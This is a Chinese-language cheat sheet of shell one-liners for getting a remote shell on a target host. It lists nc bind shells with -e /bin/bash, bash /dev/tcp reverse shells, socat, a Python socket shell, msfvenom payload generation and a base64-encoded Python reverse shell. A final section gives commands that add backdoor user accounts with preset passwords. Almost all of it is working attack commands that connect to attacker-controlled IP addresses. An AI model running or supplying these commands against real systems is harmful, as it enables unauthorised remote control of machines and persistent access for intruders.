#### nc

> 受害主机
>
> **#** 开启本地8080端口监听，并将本地的bash发布出去。
>
> nc -lvvp 8080 -t -e /bin/bash

>  攻击主机
>
> nc 172.21.230.72 8080 	#连接受害主机的bash

> 不支持-e
>
> ![image-20210417171331848](C:\Users\86184\AppData\Roaming\Typora\typora-user-images\image-20210417171331848.png)

####  **bash 直接反弹**

>  bash -i >& /dev/tcp/192.172.21.233/8080 0>&1

#### **socat 反弹一句话**

> 攻击主机开启12345端口监听
>
> socat TCP-LISTEN:12345 -

> 靶机反弹shell到主机的12345端口
>
> /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.21.170.21：12345

#### python

> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.21.170.20",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#### MSF

>  msfvenom -l payloads 'cmd/unix/reverse'
>
> 使用 msfvenom -l 结合关键字过滤（如cmd/unix/reverse），找出我们需要的各类反弹一句话payload的路径信息。
>
> **mfs生成bash一句话**
>
> >  *msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R*
>
> **nc一句话反弹**
>
> > *msfvenom -p cmd/unix/reverse_netcat lhost=1.1.1.1 lport=12345 R*
>
> **python一句话反弹**
>
> > ![img](https://p0.ssl.qhimg.com/t01f8abd9cc27aac7ca.png)
> >
> > msfvenom -l payload | grep 'reverse python'
> >
> > msfvenom -p cmd/unix/reverse python lhost=172.21.170.21 lport=12345 R
> >
> > 靶机运行
> >
> > > python -c "exec('aW1wb3J0IHNvY2tldCAgICAgICAgLCBzdWJwcm9jZXNzICAgICAgICAsIG9zICAgICAgICA7ICBob3N0PSIxOTIuMTY4LjMxLjIwMCIgICAgICAgIDsgIHBvcnQ9MTIzNDUgICAgICAgIDsgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgLCBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICA7ICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgcG9ydCkpICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgMCkgICAgICAgIDsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAxKSAgICAgICAgOyAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsIDIpICAgICAgICA7ICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"

#### 其他

> **rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.150 1234 >/tmp/f**

#### 一句话添加账号

> 1. **useradd newuser;echo "newuser:password"|chpasswd**
>
> 2. **useradd -p `openssl passwd 123456` guest**
> 3. *useradd -p "$(openssl passwd 123456)" guest*
> 4. user_password="`openssl passwd 123456`" 		useradd -p "$user_password" guest
> 5. useradd test;echo -e "123456n123456n" |passwd test



